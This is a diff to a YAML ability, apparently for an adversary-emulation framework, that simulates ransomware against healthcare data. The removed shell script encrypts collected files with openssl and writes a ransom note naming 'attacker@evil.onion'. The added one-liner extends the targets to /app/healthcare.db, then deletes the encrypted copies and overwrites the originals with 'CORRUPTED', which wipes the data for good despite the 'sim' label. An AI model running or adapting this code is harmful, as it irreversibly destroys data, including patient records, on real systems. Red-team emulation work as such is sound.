@@ -1,6 +1,6 @@
 - id: "impact-sim-encrypt"
   name: "Encrypt Collected Data"
-  description: "Encrypts collected healthcare data with AES-256-CBC and drops a ransom note."
+  description: "Encrypts collected healthcare data and drops a ransom note."
   tactic: "impact"
   technique:
     attack_id: "T1486"
@@ -10,45 +10,4 @@
       sh:
         timeout: 120
         command: |
-          OUTDIR="/tmp/recon"
-          RANSOM_KEY="RansomKey_$(hostname)_$(date +%s)"
-          KEY_FILE="${OUTDIR}/.ransom_key"
-          ENCRYPTED_COUNT=0
-
-          # Salva la chiave in un file separato (per decifratura in fase di analisi)
-          echo "${RANSOM_KEY}" > "${KEY_FILE}"
-          chmod 600 "${KEY_FILE}"
-
-          for f in "${OUTDIR}"/*.json "${OUTDIR}"/*.tar.gz; do
-            [ -f "${f}" ] || continue
-            if openssl enc -aes-256-cbc -pbkdf2 -pass "pass:${RANSOM_KEY}" \
-                 -in "${f}" -out "${f}.enc" 2>/dev/null; then
-              rm -f "${f}"
-              ENCRYPTED_COUNT=$((ENCRYPTED_COUNT + 1))
-              echo "ENCRYPTED: ${f} -> ${f}.enc"
-            else
-              echo "WARN: failed to encrypt ${f}"
-            fi
-          done
-
-          if [ "${ENCRYPTED_COUNT}" -eq 0 ]; then
-            echo "No files found to encrypt in ${OUTDIR}"
-            exit 1
-          fi
-
-          # Ransom note
-          cat > "${OUTDIR}/README_DECRYPT.txt" << RANSOMNOTE
-          ===================================================
-                YOUR FILES HAVE BEEN ENCRYPTED
-          ===================================================
-          Files encrypted: ${ENCRYPTED_COUNT}
-          Algorithm: AES-256-CBC (PBKDF2)
-          Key ID: ${RANSOM_KEY}
-          Contact: attacker@evil.onion
-          ===================================================
-          RANSOMNOTE
-
-          echo "Encryption complete: ${ENCRYPTED_COUNT} file(s) encrypted."
-          echo "Ransom note at ${OUTDIR}/README_DECRYPT.txt"
-          echo "Key saved to ${KEY_FILE}"
-          ls -lha "${OUTDIR}/"
+          OUTDIR="/tmp/recon"; R_KEY="RansomKey_$(hostname)_$(date +%s)"; K_FILE="$OUTDIR/.ransom_key"; COUNT=0; if [ ! -d "$OUTDIR" ]; then exit 1; fi; echo "$R_KEY" > "$K_FILE"; for f in "$OUTDIR"/*.json "$OUTDIR"/*.tar.gz /app/healthcare.db*; do [ -f "$f" ] || continue; if openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$R_KEY" -in "$f" -out "$f.enc" 2>/dev/null; then mv "$f.enc" "$f.ransom"; echo "CORRUPTED" > "$f"; rm -f "$f.ransom"; COUNT=$((COUNT+1)); fi; done; if [ "$COUNT" -eq 0 ]; then exit 1; fi; echo "FILES ENCRYPTED. Key: $R_KEY" > "$OUTDIR/README_DECRYPT.txt"
